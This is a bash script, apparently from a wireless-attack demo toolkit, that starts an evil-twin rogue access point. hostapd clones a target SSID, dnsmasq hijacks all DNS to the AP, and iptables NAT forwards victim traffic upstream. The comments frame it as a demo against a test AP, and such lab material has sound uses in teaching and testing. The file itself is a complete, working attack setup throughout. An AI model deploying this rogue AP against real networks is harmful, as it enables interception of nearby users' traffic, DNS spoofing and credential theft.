#!/usr/bin/env bash
# Bring up the rogue AP for the evil-twin demo.
#   - hostapd on $AP_IFACE serves the SSID configured in
#     configs/hostapd-rogue.conf
#   - dnsmasq hands out DHCP and hijacks all DNS to the AP itself
#   - iptables NAT forwards onward via $UPSTREAM_IFACE
#
# Edit configs/hostapd-rogue.conf BEFORE running — at minimum set the SSID
# to match the test AP you are cloning.
#
# Stop with scripts/07-cleanup.sh

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

require_root

AP_IFACE="${AP_IFACE:-wlan2}"
UPSTREAM_IFACE="${UPSTREAM_IFACE:-eth0}"
AP_IP="${AP_IP:-10.0.0.1/24}"

warn "Evil-twin AP coming up:"
warn "  AP iface       = $AP_IFACE"
warn "  Upstream iface = $UPSTREAM_IFACE (NAT via this)"
warn "  AP IP          = $AP_IP"
warn "  hostapd config = $ROOT/configs/hostapd-rogue.conf"
warn "  dnsmasq config = $ROOT/configs/dnsmasq-rogue.conf"
sleep 3

info "Configuring $AP_IFACE..."
ip addr flush dev "$AP_IFACE" || true
ip addr add "$AP_IP" dev "$AP_IFACE"
ip link set "$AP_IFACE" up

info "Enabling IP forwarding + NAT..."
sysctl -w net.ipv4.ip_forward=1 >/dev/null
iptables -t nat -A POSTROUTING -o "$UPSTREAM_IFACE" -j MASQUERADE
iptables -A FORWARD -i "$AP_IFACE" -o "$UPSTREAM_IFACE" -j ACCEPT
iptables -A FORWARD -i "$UPSTREAM_IFACE" -o "$AP_IFACE" \
    -m state --state RELATED,ESTABLISHED -j ACCEPT

info "Starting hostapd..."
hostapd "$ROOT/configs/hostapd-rogue.conf" &
HOSTAPD_PID=$!

info "Starting dnsmasq..."
dnsmasq --no-daemon -C "$ROOT/configs/dnsmasq-rogue.conf" &
DNSMASQ_PID=$!

info "Rogue AP up.  hostapd PID=$HOSTAPD_PID  dnsmasq PID=$DNSMASQ_PID"
info "Stop with scripts/07-cleanup.sh in another terminal."
wait
